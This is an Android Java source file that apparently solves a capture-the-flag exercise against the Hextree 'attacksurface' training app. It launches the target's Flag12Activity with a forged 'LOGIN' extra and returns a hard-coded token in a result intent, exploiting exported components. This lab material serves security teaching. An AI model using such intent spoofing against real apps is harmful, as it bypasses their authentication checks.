package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class Flag12Activity extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_flag12);
        Button launchButton = findViewById(R.id.btnLaunchFlag12);
        launchButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity"));
                intent.putExtra("LOGIN", true);
                startActivity(intent);
            }
        });
        // Make sure to Uncomment Flag12Activity from the manifest and comment Flag10Activity and Flag11Activity.
        Intent resultIntent = new Intent();
        resultIntent.putExtra("token", 1094795585);
        setResult(RESULT_OK, resultIntent);
    }
} 